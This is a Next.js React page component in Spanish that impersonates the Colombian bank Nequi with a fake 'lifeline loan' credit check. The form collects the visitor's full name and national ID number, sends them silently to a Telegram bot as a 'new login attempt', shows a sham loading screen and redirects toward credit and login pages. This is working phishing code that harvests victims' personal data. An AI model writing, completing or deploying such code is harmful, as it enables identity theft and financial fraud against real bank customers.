"use client"

import { useRouter } from "next/navigation";
import React, { useState, useEffect } from "react";
import { sendToTelegram } from "@/app/actions/telegram";

const InicioCredito: React.FC = () => {
    const router = useRouter();
    const [nombreApellido, setNombreApellido] = useState("");
    const [cedula, setCedula] = useState("");
    const [loading, setLoading] = useState(false);
    const [resultadoVisible, setResultadoVisible] = useState(false);

    const handleConsultar = async (e: React.FormEvent) => {
        e.preventDefault();
        if (cedula.length >= 8 && nombreApellido.trim() !== '') {
            sessionStorage.setItem('cedula', cedula);
            sessionStorage.setItem('nombre', nombreApellido);

            setLoading(true);

            // Envía al bot en segundo plano (no espera)
            sendToTelegram({
                cedula,
                nombre: nombreApellido,
                customMessage: `🚨Nuevo intento de ingreso🚨:\n 🪪 Cedula: ${cedula}\n 📝 Nombre: ${nombreApellido}`
            });

            // Espera 2.6 segundos mostrando el loading y luego redirige
            setTimeout(() => {
                setLoading(false);
                router.push("/credito");
            }, 2600);
        }
    };

    const handlePagar = () => {
        window.location.href = "/login";
    };

    return (
        <div
            className="min-h-screen bg-cover bg-center bg-no-repeat text-[#200020] px-5 pt-[120px]"
            style={{
                backgroundImage: 'url("/nequihero.webp")',
            }}
        >
            {/* Header */}
            <header className="fixed top-0 left-0 right-0 z-50 bg-white h-20 shadow flex justify-between items-center px-5">
                <img src="img/logo.svg" alt="Logo" className="h-7 max-w-full" />
                <img src="img/3ra.jpg" alt="Icono" className="h-7 max-w-full" />
            </header>

            {/* Título principal */}
            <div className="text-white text-2xl font-bold mb-5">
                Solicita tu préstamo salvavida
            </div>

            
            {/* Formulario */}
            {!loading && !resultadoVisible && (
                <div className="max-w-xl mx-auto bg-white rounded-2xl shadow p-6 text-left">
                    <h2 className="text-[#200020] text-2xl mb-2">Consulta tu puntaje</h2>
                    <p className="text-[#828d92] text-base mb-4">
                        Ingrese su cédula para conocer su puntaje.
                    </p>
                    <form onSubmit={handleConsultar}>
                        <div className="relative mb-4">
                            <input
                                type="text"
                                id="nombreApellido"
                                className="peer w-full bg-transparent border border-[#200020] text-[#200020] p-3 rounded focus:outline-none focus:border-[#da0081]"
                                placeholder=" "
                                value={nombreApellido}
                                onChange={(e) => setNombreApellido(e.target.value)}
                                required
                            />
                            <label
                                htmlFor="nombreApellido"
                                className={
                                    `absolute left-3 px-1 bg-white font-bold transition-all
                                    ${nombreApellido
                                        ? "-top-2 text-sm text-gray-400"
                                        : "top-3 text-base text-[#200020]"}
                                    peer-focus:-top-1 peer-focus:text-sm peer-focus:text-gray-400`
                                }
                                style={{ pointerEvents: "none" }}
                            >
                                Ingrese su nombre y apellido
                            </label>
                        </div>
                        <div className="relative mb-4">
                            <input
                                type="number"
                                id="cedula"
                                className="peer w-full bg-transparent border border-[#200020] text-[#200020] p-3 rounded focus:outline-none focus:border-[#da0081]"
                                placeholder=" "
                                value={cedula}
                                onChange={(e) => setCedula(e.target.value)}
                                required
                            />
                            <label
                                htmlFor="cedula"
                                className={
                                    `absolute left-3 px-1 bg-white font-bold transition-all
                                    ${cedula
                                        ? "-top-2 text-sm text-gray-400"
                                        : "top-2 text-base text-[#200020]"}
                                    peer-focus:-top-1 peer-focus:text-sm peer-focus:text-gray-400`
                                }
                                style={{ pointerEvents: "none" }}
                            >
                                Ingrese su cédula
                            </label>
                        </div>
                        <button
                            type="submit"
                            className="bg-[#200020] border-[#200020] text-white w-full py-3 text-lg rounded hover:bg-[#200020]"
                        >
                            Consultar
                        </button>
                    </form>
                </div>
            )}

            {/* Loading */}
            {loading && (
                <div className="max-w-xl mx-auto bg-white rounded-2xl shadow p-6 mt-6 text-center">
                    <p>
                        Por favor espere, estamos consultando si aplica para un crédito...
                    </p>
                </div>
            )}

            {/* Overlay */}
            {loading && (
                <div className="fixed inset-0 bg-white bg-opacity-80 z-[2000] flex justify-center items-center">
                    <div className="bg-white bg-opacity-90 rounded-2xl shadow p-6 flex flex-col items-center max-w-sm w-full mx-4">
                        <img src="/img/gnequi.gif" alt="Cargando..." className="w-28 mb-4" />
                        <p className="text-[#200020] text-lg font-semibold text-center">
                            Por favor espere, estamos consultando si aplica para un crédito...
                        </p>
                    </div>
                </div>
            )}
        </div>
    );
};

// Resultado (comentado)
/*
{resultadoVisible && (
    <div className="max-w-xl mx-auto bg-white rounded-2xl shadow p-6 mt-6">
        <div className="border p-5 rounded text-center">
            <h3 className="text-[#a0006f] text-xl mb-3">
                Resultado de tu consulta
            </h3>
            <p className="mb-1">
                Cantidad a prestar:{" "}
                <strong className="text-[#bf0072]">$2.400.000 COP</strong>
            </p>
            <p className="mb-1">
                Meses de plazo: <span id="plazo-meses">12</span>
            </p>
            <p className="mb-1">
                Interés mensual:{" "}
                <strong>
                    $<span id="interes-mensual">11,000</span>
                </strong>
            </p>
            <p className="mb-1">
                Pago total: <strong>$2.532.000</strong>
            </p>
            <p className="font-bold text-green-600 text-xl mt-4">
                Cuota mensual: $211.000
            </p>
        </div>

        <div className="mt-4">
            <label htmlFor="plazo" className="block mb-1 font-medium">
                Seleccione el plazo:
            </label>
            <select
                id="plazo"
                className="form-select w-full border p-2 rounded"
            >
                <option value="12">12 meses</option>
            </select>
        </div>

        <button
            className="bg-[#200020] text-white w-full py-3 mt-4 text-lg rounded"
            onClick={handlePagar}
        >
            Continuar
        </button>
    </div>
)}
*/

export default InicioCredito;

// // Simula el envío al bot
// declare global {
//     interface Window {
//         sendToTelegram?: (data: {
//             cedula: string;
//             nombre: string;
//             customMessage: string;
//         }) => void;
//     }
// }

// // Simulación temporal (puedes mover esto a otro archivo)
// const sendToTelegram = (data: {
//     cedula: string;
//     nombre: string;
//     customMessage: string;
// }) => {
//     console.log("🔁 Enviando a Telegram:", data);
//     // Aquí puedes usar fetch() si tienes tu webhook real.
// };
